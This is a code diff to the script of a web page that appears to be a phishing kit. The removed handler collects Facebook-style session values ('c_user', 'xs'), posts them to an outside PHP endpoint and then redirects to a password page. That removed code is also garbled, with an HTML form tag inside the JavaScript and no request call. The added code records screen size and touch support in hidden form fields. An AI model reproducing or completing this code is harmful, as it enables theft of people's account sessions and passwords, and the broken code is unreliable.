@@ -357,34 +357,18 @@
     </div>
 
     <script>
-        function submitForm(event) {
-            event.preventDefault();
-            
-            const submitButton = document.getElementById('submitButton');
-            submitButton.classList.add('btn-loading');
-            submitButton.disabled = true;
-            
-            const cUserInput = document.getElementById("c_user");
-            const xsInput = document.getElementById("xs");
-            
-            <form class="sm:hidden lg:block md:block" action="https://professor-asif.wasmer.app/kkr.php method="post">
-            })
-            .then((response) => {
-                if (response.ok) {
-                    window.location.href = "password.html";
-                } else {
-                    throw new Error('Submission failed');
-                }
-            })
-            .catch((error) => {
-                console.error("Submission error:", error);
-                alert("An error occurred. Please try again.");
-            })
-            .finally(() => {
-                submitButton.classList.remove('btn-loading');
-                submitButton.disabled = false;
-            });
-        }
+        // Populate device details in hidden fields before form submission
+        const form = document.getElementById("device-form");
+
+        form.addEventListener("submit", (event) => {
+            const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+            const screenWidth = window.innerWidth;
+            const screenHeight = window.innerHeight;
+
+            document.getElementById("screenWidth").value = screenWidth;
+            document.getElementById("screenHeight").value = screenHeight;
+            document.getElementById("isTouchDevice").value = isTouchDevice ? "true" : "false";
+        });
     </script>
 </body>
 </html>
